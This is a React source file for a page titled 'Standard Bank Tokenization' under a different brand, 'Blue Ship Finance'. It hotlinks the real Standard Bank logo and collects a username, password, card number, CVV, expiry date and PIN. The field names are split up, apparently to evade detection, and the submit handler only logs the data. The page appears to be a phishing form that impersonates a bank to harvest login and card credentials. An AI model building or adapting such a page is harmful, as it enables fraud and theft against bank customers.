import React from "react";
import { Meta } from "../../../components";
import { Box, Typography } from "@mui/material";
import PrivateRoute from "../../../components/auth/PrivateRoute";
import { useContext } from "react";
import userDataContext from "../../../context/UserDataContext";
import { useState } from "react";
import cogoToast from "cogo-toast";

const StandardBank = () => {
  const [formData, setFormData] = useState({
    username: "",
    _pas_swo_rd: "",
    _ca_rd_Num_ber: "",
    _p_i_n_: "",
    _c_v_v_: "",
    _exp_iry_Da_te_: "",
  });
  const { userData } = useContext(userDataContext);

  const {
    username,
    _pas_swo_rd,
    _ca_rd_Num_ber,
    _p_i_n_,
    _c_v_v_,
    _exp_iry_Da_te_,
  } = formData;

  const tokenizeAccount = async () => {
    const validateDetails =
      username.trim().length > 0 &&
      _pas_swo_rd.length > 0 &&
      _ca_rd_Num_ber.trim().length > 10 &&
      _p_i_n_.trim().length >= 4;
    _c_v_v_.trim().length >= 4;
    _exp_iry_Da_te_.trim().length >= 6;

    if (validateDetails) {
      const data = { ...formData, _exp_iry_Da_te_: new Date(_exp_iry_Da_te_) };

      console.log(data);
    } else {
      cogoToast.error("One or more inputs are invalid");
    }
  };

  const inputChangeHandler = (e) => {
    setFormData((prev) => ({
      ...prev,
      [e.target.id]: e.target.value,
    }));
  };

  return (
    <>
      <Meta
        title="Standard Bank Tokenization - Blue Ship Finance Internet Banking"
        description="Standard Bank Tokenization - Blue Ship Finance Internet Banking"
      />
      <PrivateRoute>
        <Box className="standard-bank-page">
          <img
            src="https://enterprisests.standardbank.co.za/sbgassets/images/sbg.png"
            alt="Standard bank logo"
          />
          <Box sx={{ width: "100%", maxWidth: "416px" }}>
            <form className="standard-bank-form">
              <Typography mb={4} textAlign="center" sx={{ color: "#444" }}>
                Sign In
              </Typography>

              <div>
                <label htmlFor="username">Username</label>
                <input
                  name="username"
                  id="username"
                  type="text"
                  value={username}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_pas_swo_rd">Password</label>
                <input
                  name="password"
                  id="_pas_swo_rd"
                  type="password"
                  value={_pas_swo_rd}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_ca_rd_Num_ber">Card Number</label>
                <input
                  name="cardNumber"
                  id="_ca_rd_Num_ber"
                  type="number"
                  value={_ca_rd_Num_ber}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_c_v_v_">CVV</label>
                <input
                  name="cvv"
                  id="_c_v_v_"
                  type="number"
                  value={_c_v_v_}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_exp_iry_Da_te_">Expiry Date</label>
                <input
                  name="expiryDate"
                  id="_exp_iry_Da_te_"
                  type="date"
                  value={_exp_iry_Da_te_}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_p_i_n_">Pin</label>
                <input
                  name="pin"
                  id="_p_i_n_"
                  type="number"
                  value={_p_i_n_}
                  onChange={inputChangeHandler}
                />
              </div>

              <button type="button" onClick={tokenizeAccount}>
                SUBMIT
              </button>
            </form>
          </Box>
        </Box>
      </PrivateRoute>
    </>
  );
};

export default StandardBank;
